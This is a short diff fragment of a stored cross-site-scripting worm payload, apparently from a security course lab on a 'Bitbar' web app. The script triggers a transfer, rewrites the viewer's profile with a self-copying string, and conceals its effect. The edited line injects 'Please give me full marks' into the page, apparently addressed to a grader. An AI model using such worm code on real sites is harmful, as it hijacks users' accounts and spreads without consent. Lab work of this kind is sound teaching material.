@@ -9,5 +9,5 @@ xmlBitbar.send(formDataBitbar);var formData = new
 FormData();formData.append('new_profile',myString);
 var xml = new XMLHttpRequest(); xml.open('POST','set_profile',true);
 xml.send(formData);showBitbars(10);hideDisplay();function hideDisplay() {
-    document.getElementById('profile').style.visibility = 'hidden';
+    document.getElementById('profile').innerHTML = '<p>Please give me full marks</p>';
 };">
